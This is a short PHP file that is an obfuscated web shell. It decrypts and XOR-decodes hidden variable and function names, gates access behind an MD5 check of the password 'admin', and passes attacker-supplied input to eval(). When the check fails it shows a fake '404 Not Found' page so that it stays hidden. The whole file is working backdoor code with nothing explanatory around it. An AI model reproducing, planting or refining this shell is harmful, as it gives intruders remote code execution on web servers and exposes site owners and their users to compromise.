
<?php
$a = ${base64_decode(openssl_decrypt("Lgjy1GJq3i90SAn6+weefA==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("MV5FHu+luRti7DJVAjt1+Q==","AES-128-ECB", "21232f297a57a5a7"))}[1];
$b = ${base64_decode(openssl_decrypt("o5nroR9NPtSvoTuEmyqy+A==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("4MQ0qs8BnikMl6QA3fEfSw==","AES-128-ECB", "21232f297a57a5a7"))}[2];
//  1 is md5('admin'). You can have on your own.

if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {"/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/"."/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/".eval($p)."//bfb488af0079f3170831bd4cb40525de";}};
	$t = base64_decode(openssl_decrypt("610rJwc5aQHmJs63GYrhl/xj0QeaOsffhQ8+ggzZHAM=","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("d4LuKXiH4SpLy8+HKMyMJI7R52ftwmwqPdBnqL3N7Pc=","AES-128-ECB", "21232f297a57a5a7"));
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
